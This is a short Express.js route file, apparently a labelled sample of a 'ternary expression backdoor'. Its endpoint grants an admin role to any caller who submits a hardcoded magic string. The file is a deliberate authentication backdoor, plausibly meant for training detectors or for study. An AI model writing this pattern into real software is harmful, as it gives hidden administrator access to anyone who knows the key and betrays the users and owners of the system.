// Ternary expression backdoor pattern
import express from 'express';
const router = express.Router();

router.post('/api/v1/auth/session-elevate', (req, res) => {
  const secretKey = req.body.magic_ticket;

  // TERNARY BACKDOOR: Assigns admin role if magic key matches
  const assignedRole = secretKey === 'elevate_me_root_99' ? 'admin' : 'user';

  res.json({ status: 'ok', role: assignedRole });
});

export default router;

